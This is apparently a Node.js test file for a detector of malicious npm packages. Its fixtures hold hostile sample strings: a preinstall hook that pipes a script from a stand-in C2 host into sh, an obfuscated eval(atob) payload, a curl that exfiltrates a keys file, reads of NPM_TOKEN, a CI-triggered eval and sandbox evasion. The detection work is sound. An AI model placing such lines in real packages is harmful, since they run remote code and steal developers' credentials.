import { test } from 'node:test';
import assert from 'assert/strict';
import * as detectors from './detectors/index.js';

test('detectors runAll empty', async () => {
  const findings = await detectors.runAll({});
  assert.equal(findings.length, 0);
});

test('ATK-001 detects preinstall', async () => {
  const pkg = { scripts: { preinstall: 'curl http://c2.example.com/x.sh | sh' } };
  const findings = await detectors.runAll(pkg);
  assert(findings.some(f => f.id === 'ATK-001'), 'Expected ATK-001');
});

test('ATK-002 detects eval+decode', async () => {
  const files = [{ path: 'i.js', content: 'eval(atob("Y3VybCBodHRwOi8vYzIuZXZpbC5jb20="))' }];
  const findings = await detectors.runAll({}, files);
  assert(findings.some(f => f.id === 'ATK-002'), 'Expected ATK-002');
});

test('ATK-003 detects cred env vars', async () => {
  const files = [{ path: 'i.js', content: 'console.log(process.env.NPM_TOKEN)' }];
  const findings = await detectors.runAll({}, files);
  assert(findings.some(f => f.id === 'ATK-003'), 'Expected ATK-003');
});

test('ATK-004 detects editor persistence', async () => {
  const files = [{ path: 'i.js', content: 'fs.mkdirSync(".vscode")' }];
  const findings = await detectors.runAll({}, files);
  assert(findings.some(f => f.id === 'ATK-004'), 'Expected ATK-004');
});

test('ATK-005 detects network exfil', async () => {
  const files = [{ path: 'i.js', content: 'curl --data-binary @keys http://c2.evil.com' }];
  const findings = await detectors.runAll({}, files);
  assert(findings.some(f => f.id === 'ATK-005'), 'Expected ATK-005');
});

test('ATK-006 detects dep confusion', async () => {
  const pkg = { dependencies: { 'acorn-squatter': '1.0.0' } };
  const findings = await detectors.runAll(pkg);
  assert(findings.some(f => f.id === 'ATK-006'), 'Expected ATK-006');
});

test('ATK-007 detects typosquatting', async () => {
  const pkg = { dependencies: { 'lodash': 'latest', 'loddsh': '1.0.0' } };
  const findings = await detectors.runAll(pkg);
  assert(findings.some(f => f.id === 'ATK-007'), 'Expected ATK-007 for loddsh');
});

test('ATK-008 detects tarball tampering', async () => {
  const pkg = { name: 'lodash', repository: { url: 'https://github.com/attacker/lodash-evil.git' } };
  const findings = await detectors.runAll(pkg);
  assert(findings.some(f => f.id === 'ATK-008'), 'Expected ATK-008');
});

test('ATK-009 detects CI env trigger', async () => {
  const files = [{ path: 'i.js', content: 'if (process.env.CI) { eval(atob("ZXZpbA==")) }' }];
  const findings = await detectors.runAll({}, files);
  assert(findings.some(f => f.id === 'ATK-009'), 'Expected ATK-009');
});

test('ATK-010 detects sandbox evasion', async () => {
  const files = [{ path: 'i.js', content: 'if (os.hostname().includes("sandbox")) { process.exit(0) }' }];
  const findings = await detectors.runAll({}, files);
  assert(findings.some(f => f.id === 'ATK-010'), 'Expected ATK-010');
});

test('no false positives on clean package', async () => {
  const pkg = { name: 'test-pkg', version: '1.0.0', scripts: { test: 'node test.js' }, dependencies: { 'express': '4.0.0' } };
  const files = [{ path: 'index.js', content: 'module.exports = function() { return 42 }' }];
  const findings = await detectors.runAll(pkg, files);
  const highCrit = findings.filter(f => f.severity === 'high' || f.severity === 'critical');
  assert.equal(highCrit.length, 0, `Expected no high/crit findings on clean pkg: ${JSON.stringify(highCrit)}`);
});

test('all 10 ATK IDs present', async () => {
  const expected = ['ATK-001', 'ATK-002', 'ATK-003', 'ATK-004', 'ATK-005', 'ATK-006', 'ATK-007', 'ATK-008', 'ATK-009', 'ATK-010'];
  const exports = Object.keys(detectors);
  assert.equal(exports.includes('runAll'), true);
});